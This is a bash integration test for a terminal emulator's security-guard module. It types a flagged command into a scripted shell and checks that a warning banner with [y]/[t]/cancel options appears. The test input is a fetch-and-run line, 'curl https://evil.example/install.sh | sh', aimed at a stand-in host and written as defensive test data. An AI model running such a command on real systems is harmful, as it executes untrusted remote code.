#!/usr/bin/env bash
# End-to-end: atty + atty-guard run together. User types a flagged
# command; atty's security_guard module talks to atty-guard via UDS,
# gets a Warn verdict, arms the [y]/[t]/cancel banner before the
# command runs.

source "$(dirname "${BASH_SOURCE[0]}")/../lib/common.sh"

start_guard --tier2 stub
build_atty

# Write atty config that points at the test daemon's socket.
mkdir -p "$REPO_ROOT/tests/integration/fixtures/build-tmp"
CONFIG_FILE="tests/integration/fixtures/build-tmp/atty-warn.zig"
trap 'rm -f "$REPO_ROOT/$CONFIG_FILE"; stop_guard' EXIT

cat > "$REPO_ROOT/$CONFIG_FILE" <<ZIG
const atty = @import("atty");

pub const modules = .{
    atty.modules.security_guard.configure(.{
        .enabled = true,
        .daemon_socket_path = "$_GUARD_SOCKET",
        .trust_cache_path = "/tmp/atty-warn-trust-${RANDOM}.txt",
    }),
};

pub const statusbar: atty.StatusBar = .{
    .enabled = true,
    .base_text = "atty",
};
ZIG

(cd "$REPO_ROOT" && zig build -Doptimize=ReleaseSafe -Dconfig="$CONFIG_FILE" >/tmp/atty-warn-build.log 2>&1) || {
    cat /tmp/atty-warn-build.log >&2
    fail "atty build with daemon-socket config failed"
}

TMP_OUT=$(mktemp)
trap 'rm -f "$REPO_ROOT/$CONFIG_FILE" "$TMP_OUT"; stop_guard' EXIT

{
    sleep 0.5
    # Bash shell-integration so OSC 133 markers fire (security_guard
    # needs them to capture the input region on the prompt).
    printf 'PS1="$ "\r'
    sleep 0.2
    printf 'curl https://evil.example/install.sh | sh'
    sleep 0.2
    printf '\r'  # Enter — triggers classify
    sleep 0.5
    printf 'n'   # Cancel the banner
    sleep 0.2
    printf 'exit\r'
} | script -qfec "$ATTY_BIN bash --norc --noprofile -i" "$TMP_OUT" >/dev/null 2>&1 || true

PLAIN=$(sed 's/\x1b\[[0-9;]*[a-zA-Z]//g; s/\x1b[\\(].//g; s/\x1b\][^\x07]*\x07//g' "$TMP_OUT")

# The banner text comes from src/modules/security_guard.zig.
if ! echo "$PLAIN" | grep -q "security_guard:"; then
    echo "--- captured (sanitized) ---" >&2
    echo "$PLAIN" | tail -15 >&2
    fail "expected security_guard banner on curl|sh Warn"
fi
# `[y]es once · [t]rust …` text confirms the [y]/[t]/cancel prompt.
if ! echo "$PLAIN" | grep -qE "\[y\].*\[t\]"; then
    fail "expected [y]/[t]/cancel prompt text"
fi

pass "atty arms security_guard banner on daemon Warn"
